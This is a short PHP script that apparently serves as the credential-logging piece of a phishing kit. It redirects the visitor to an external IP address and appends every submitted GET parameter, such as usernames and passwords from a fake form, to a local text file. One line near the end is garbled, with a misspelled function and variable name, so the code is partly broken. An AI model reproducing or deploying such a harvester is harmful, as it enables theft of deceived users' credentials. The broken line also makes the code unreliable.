<?php
header("Location: http://158.69.119.209/data/index.php ");
$handle = fopen("yaeresmio.txt", "a"); 

foreach($_GET as $variable => $value) {
	fwrite($handle, $variable);

	fwrite($handle, "=");

	fwrite($handle, $value);

	fwrite($handle, "\r\n");
}

frité($ande, "\r\n");
fclose($handle);

exit
?>